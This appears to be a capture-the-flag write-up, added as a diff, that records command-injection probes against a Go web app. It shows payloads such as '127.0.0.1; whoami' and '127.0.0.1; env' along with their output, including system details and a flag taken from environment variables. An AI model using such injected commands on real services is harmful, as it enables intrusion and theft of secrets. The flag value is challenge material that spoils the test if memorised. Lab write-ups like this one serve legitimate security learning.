@@ -1,0 +1,88 @@
+I checked if the input was vulnerable to command injection with:
+127.0.0.1; whoami
+
+Returning:
+date: invalid date '@127.0.0.1'
+challenge
+
+
+Another commands:
+127.0.0.1; ls
+
+date: invalid date '@127.0.0.1'
+go.mod
+go.sum
+main
+main.go
+views
+
+
+
+127.0.0.1; find / -type f -name "*.txt" 2>/dev/null
+exit status 1
+
+
+
+127.0.0.1; date -d "$input"
+
+date: invalid date '@127.0.0.1'
+Mon May 12 00:00:00 UTC 2025
+
+
+
+127.0.0.1; cat /flag
+exit status 1
+
+
+
+
+127.0.0.1; uname -a; whoami; id
+date: invalid date '@127.0.0.1'
+Linux e7c1352e71ec 5.13.0-1014-aws #15~20.04.1-Ubuntu SMP Thu Feb 10 17:55:03 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+challenge
+uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
+
+
+
+127.0.0.1; whoami; id; uname -a; pwd; ls -la; env
+date: invalid date '@127.0.0.1'
+challenge
+uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
+Linux e7c1352e71ec 5.13.0-1014-aws #15~20.04.1-Ubuntu SMP Thu Feb 10 17:55:03 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+/home/challenge
+total 13772
+drwxr-xr-x 1 root root     4096 Mar  2  2022 .
+drwxr-xr-x 1 root root     4096 Mar  2  2022 ..
+-rw-r--r-- 1 root root      220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 root root     3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 root root      807 Feb 25  2020 .profile
+-rw-rw-r-- 1 root root      236 Mar  2  2022 go.mod
+-rw-rw-r-- 1 root root    52843 Mar  2  2022 go.sum
+-rwxr-xr-x 1 root root 14014363 Mar  2  2022 main
+-rw-rw-r-- 1 root root     1164 Mar  2  2022 main.go
+drwxrwxr-x 1 root root     4096 Mar  2  2022 views
+HOSTNAME=e7c1352e71ec
+PWD=/home/challenge
+HOME=/home/challenge
+GOLANG_VERSION=1.15.7
+FLAG=flag{7da6c7debd40bd611560c13d8149b647}
+SHLVL=1
+PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+
+
+
+
+127.0.0.1; env
+I learned in this type of challenges it's important to check for the **env** command for this kind of vulnerability.
+
+
+
+
+
+
+
+
+
+
+
